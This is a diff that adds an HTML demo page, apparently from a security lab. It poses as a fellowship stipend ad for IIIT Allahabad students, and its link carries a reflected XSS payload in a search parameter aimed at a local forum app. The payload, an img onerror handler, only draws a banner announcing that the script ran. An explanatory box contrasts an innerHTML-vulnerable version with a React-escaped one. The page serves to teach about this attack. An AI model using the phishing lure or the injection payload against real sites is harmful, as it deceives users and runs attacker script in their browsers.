@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apex Innovations: Campus Fellowship Portal</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+      color: #f8fafc;
+      margin: 0;
+      padding: 30px 16px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      box-sizing: border-box;
+    }
+    .portalCard {
+      background-color: #1e293b;
+      border: 2px solid #3b82f6;
+      border-radius: 12px;
+      padding: 28px;
+      max-width: 680px;
+      width: 100%;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+    }
+    .adBadge {
+      background-color: #2563eb;
+      color: #ffffff;
+      padding: 3px 10px;
+      border-radius: 9999px;
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      display: inline-block;
+      margin-bottom: 12px;
+    }
+    .securityBadge {
+      background-color: #ef4444;
+      color: #ffffff;
+      padding: 3px 10px;
+      border-radius: 9999px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      display: inline-block;
+      margin-left: 8px;
+      margin-bottom: 12px;
+    }
+    h1 {
+      font-size: 22px;
+      margin: 0 0 10px 0;
+      color: #f8fafc;
+    }
+    p {
+      color: #94a3b8;
+      font-size: 13.5px;
+      line-height: 1.5;
+      margin-bottom: 16px;
+    }
+    .offerBox {
+      background: linear-gradient(135deg, rgba(37, 99, 235, 0.1) 0%, rgba(29, 78, 216, 0.15) 100%);
+      border: 1px solid #3b82f6;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    .offerTitle {
+      font-size: 14px;
+      font-weight: 700;
+      color: #93c5fd;
+      margin-bottom: 6px;
+    }
+    .offerDetails {
+      font-size: 12.5px;
+      color: #dbeafe;
+      line-height: 1.5;
+    }
+    .claimBtn {
+      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+      color: #ffffff;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      width: 100%;
+      text-align: center;
+      text-decoration: none;
+      display: block;
+      box-sizing: border-box;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .claimBtn:hover {
+      background: linear-gradient(135deg, #1d4ed8 0%, #1e40af 100%);
+      transform: translateY(-1px);
+    }
+    .auditBox {
+      background-color: #0f172a;
+      border: 1px solid #ef4444;
+      border-radius: 8px;
+      padding: 16px;
+      margin-top: 24px;
+    }
+    .auditTitle {
+      font-size: 13px;
+      font-weight: 700;
+      color: #f87171;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .codeSnippet {
+      font-family: Consolas, Monaco, monospace;
+      font-size: 11.5px;
+      color: #f1f5f9;
+      background-color: #1e293b;
+      padding: 10px;
+      border-radius: 6px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="portalCard">
+    <div>
+      <span class="adBadge">Disguised Phishing Ad</span>
+      <span class="securityBadge">Reflected XSS Delivery</span>
+    </div>
+    <h1>Apex Innovations: Campus Fellowship Opportunities</h1>
+    <p>
+      Congratulations IIIT Allahabad Engineering Scholars. Apex Innovations has released 2026 open source project stipends. Click below to search approved project opportunities directly through your campus forum search engine.
+    </p>
+
+    <div class="offerBox">
+      <div class="offerTitle">Fellowship Program Details:</div>
+      <div class="offerDetails">
+        Grant Value: Rs. 45,000 per approved student project<br>
+        Eligibility: Registered IIIT-A Open Source Society contributors<br>
+        Verification Mechanism: Direct search query parameter reflection
+      </div>
+    </div>
+
+    <!-- Phishing Link carrying the Reflected XSS Payload -->
+    <a id="phishingLink" href="#" class="claimBtn">
+      Search Stipend Openings on IIIT-A Forum (Triggers Reflected XSS) →
+    </a>
+
+    <div class="auditBox">
+      <div class="auditTitle">Educational Security Laboratory Context:</div>
+      <p style="margin: 0; font-size: 12.5px; color: #94a3b8;">
+        Reflected Cross Site Scripting (XSS) occurs when an attacker crafts a malicious link containing executable code within a request parameter and tricks a victim into clicking it via phishing or disguised advertisements. When clicked, the application reads the query parameter from the URL and reflects it directly into the DOM without escaping.
+      </p>
+      <div class="codeSnippet">Phishing Vector: Disguised fellowship stipend search ad
+Parameter Injected: ?search=&lt;img src="x" onerror="..." /&gt;
+V1 Result: Reflected directly into innerHTML, executing arbitrary script
+V2 Result: React framework text auto-escaping renders inert text safely</div>
+    </div>
+  </div>
+
+  <script>
+    //This does configure dynamic phishing link targeting current forum port with payload.
+    var currentPort = window.location.port || '3000';
+    var payload = '<img src="x" onerror="(function(el){var b=document.createElement(\'div\');b.id=\'reflectedXssAlertBox\';b.style=\'margin:14px 0;padding:16px;background:linear-gradient(135deg,#7f1d1d,#991b1b);border:2px solid #ef4444;border-radius:10px;color:#fef2f2;box-shadow:0 8px 20px rgba(239,68,68,0.3);\';b.innerHTML=\'<div style=\\\'display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;\\\'><span style=\\\'background:#ef4444;color:#fff;font-size:10px;padding:3px 8px;border-radius:12px;font-weight:800;text-transform:uppercase;\\\'>Reflected XSS Executed</span><span style=\\\'font-size:11px;color:#fca5a5;\\\'>Delivered via Phishing Ad</span></div><h4 style=\\\'margin:0 0 4px 0;font-size:14px;color:#fff;\\\'>Search Parameter Code Execution Succeeded</h4><p style=\\\'margin:0;font-size:12px;color:#fee2e2;\\\'>The victim clicked a disguised search sponsorship ad. The unescaped search parameter was rendered directly into the DOM via innerHTML without sanitization.</p>\';el.parentNode.appendChild(b);})(this)" />';
+    var targetUrl = window.location.protocol + '//' + window.location.hostname + ':' + currentPort + '/?search=' + encodeURIComponent(payload);
+    document.getElementById('phishingLink').href = targetUrl;
+  </script>
+</body>
+</html>
